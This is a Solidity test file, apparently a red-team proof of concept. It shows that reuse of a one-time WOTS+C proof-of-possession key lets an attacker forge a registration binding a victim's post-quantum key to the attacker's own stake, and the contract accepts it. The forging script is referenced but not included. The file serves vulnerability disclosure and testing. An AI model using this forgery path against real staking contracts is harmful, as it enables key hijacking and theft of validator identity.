// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {SystemCallTest} from "../helpers/SystemCallTest.sol";
import {PQStaking} from "../../src/PQStaking.sol";
import {PQValidatorRegistration} from "../../src/PQValidatorRegistration.sol";
import {PQBuilderRegistration} from "../../src/PQBuilderRegistration.sol";

/// PoC: the proof-of-possession leaf (slot 2^32-1) is a one-time WOTS+C key, but every distinct
/// registration (other stake, other role contract, other chain) makes the owner sign a different
/// message with it. From the three PoP-slot signatures of key A committed in
/// test/vectors/leanxmss_k.json, redteam/forge_pop.py forged (no secret key, ~4e9 Keccak calls,
/// ~3 minutes on 32 cores) a proof of possession for key A on stake 0xBEEF, which key A never
/// signed. The registration contract accepts it.
contract PopReuseForgeryTest is SystemCallTest {
    address internal constant VALIDATORS = address(0x7a11);
    address internal constant BUILDERS = address(0xb111);

    string internal forged;
    string internal vectors;

    function setUp() public {
        vm.etch(VALIDATORS, address(new PQValidatorRegistration()).code);
        vm.etch(BUILDERS, address(new PQBuilderRegistration()).code);
        forged = vm.readFile("test/vectors/redteam/forged_pop.json");
        vectors = vm.readFile("test/vectors/leanxmss_k.json");
        assertEq(block.chainid, vm.parseJsonUint(forged, ".chainId"));
    }

    function forgedRequest() internal view returns (uint64 stakeId, bytes32 pubkey, bytes memory request) {
        stakeId = uint64(vm.parseJsonUint(forged, ".stakeId"));
        pubkey = vm.parseJsonBytes32(forged, ".pubkey");
        request = abi.encodePacked(stakeId, pubkey, vm.parseJsonBytes(forged, ".signature"));
    }

    /// The forged message is not one key A ever signed (all three signed messages differ).
    function test_ForgedMessageWasNeverSigned() public view {
        (uint64 stakeId, bytes32 pubkey,) = forgedRequest();
        assertEq(pubkey, vm.parseJsonBytes32(vectors, ".pubkeyA"));
        bytes32 m = vm.parseJsonBytes32(forged, ".message");
        assertNotEq(m, vm.parseJsonBytes32(vectors, ".message"));
        assertNotEq(m, vm.parseJsonBytes32(vectors, ".registrations[0].message"));
        assertNotEq(m, vm.parseJsonBytes32(vectors, ".registrations[1].message"));
        assertNotEq(uint256(stakeId), 3);
        assertNotEq(uint256(stakeId), 4);
    }

    /// Security property: a registration whose proof of possession the key owner never produced
    /// must revert. FAILS: the forged request is accepted.
    function test_RevertWhen_PopForgedFromReusedLeaf() public {
        (uint64 stakeId, bytes32 pubkey, bytes memory request) = forgedRequest();

        // Attacker's own stake, committing to the victim's PQ key (site placeholder format
        // 0x01 || sha256(pq_pubkey)[1:]), so the CL commitment check passes as well.
        PQStaking staking = new PQStaking(stakeId);
        bytes32 commitment = bytes32(
            (uint256(sha256(abi.encodePacked(pubkey))) & (type(uint256).max >> 8)) | (uint256(1) << 248)
        );
        assertEq(staking.stake{value: 1 ether}(bytes32(uint256(0xa77ac)), commitment), stakeId);

        assertFalse(submit(VALIDATORS, request), "forged proof of possession accepted");
    }
}
